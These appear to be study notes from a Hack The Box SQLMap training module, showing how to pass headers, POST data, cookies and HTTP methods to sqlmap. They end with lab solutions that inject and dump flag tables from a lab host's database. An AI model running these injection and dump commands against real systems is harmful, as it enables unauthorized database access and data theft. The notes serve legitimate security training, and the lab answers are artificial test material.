# Building Attacks

## Curl Commands

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

```shell-session
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

```shell-session
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
## or
eldeim@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

## Custom SQLMap Requests

For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:

```shell-session
eldeim@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:

```shell-session
eldeim@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:

```shell-session
eldeim@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```



## PoCs - Questions

First flag attach into parameter "id" via POST, we can copy the website curl

```
sqlmap -u http://83.136.253.217:42957/case2.php --data 'id=1' --method POST
```

***

Second fllag, we need see all cookies and we do one with name id and value 1, ez

```
sqlmap -u "http://83.136.253.217:42957/case3.php" --cookie="id=1"
## later dump flag
sqlmap -u "http://83.136.253.217:42957/case3.php" --cookie="id=1" -D testdb -T flag3 --dump
```

***

To end, we have a sqli JSON, yeah... Something inusual

<pre><code>sqlmap -u "http://83.136.253.217:42957/case4.php" --headers="Content-Type: application/json" --data='{"id": 1}' -p id --level=5 --risk=3
## dump the flag
<strong>sqlmap -u "http://83.136.253.217:42957/case4.php" --headers="Content-Type: application/json" --data='{"id": 1}' -p id --level=5 --risk=3 -D testdb -T flag4 --dump
</strong></code></pre>

